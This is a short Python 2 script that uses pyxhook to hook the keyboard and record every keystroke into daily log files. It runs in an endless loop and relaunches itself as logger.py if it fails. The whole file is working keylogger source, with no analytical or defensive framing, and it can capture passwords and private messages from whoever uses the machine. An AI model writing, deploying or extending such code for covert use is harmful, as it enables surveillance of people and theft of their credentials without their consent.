import pyxhook
import time
from subprocess import Popen
import datetime
import os
import daemon

def kbevent( event ):
	filename = datetime.datetime.now().strftime("%Y-%m-%d")
	if not os.path.isfile('key_logs/' + filename):
		file = open('key_logs/' + filename, 'w')
	else:
		file = open('key_logs/' + filename, 'a')	
	file.write(event.Key + ' ')
	file.close()
		
if __name__ == '__main__':

	if not os.path.isdir('key_logs'):
		os.mkdir('key_logs')
	try:
		hookman = pyxhook.HookManager()
		#Define our callback to fire when a key is pressed down
		hookman.KeyDown = kbevent
		#Hook the keyboard
		hookman.HookKeyboard()
		#Start our listener
		hookman.start()

		#Create a loop to keep the application running
		running = True

		while running:
			time.sleep(0.1)
		
		#Close the listener when we are done
		hookman.cancel()
	except Exception as a:
		print "Error is: ", a
		Popen(['python', 'logger.py'])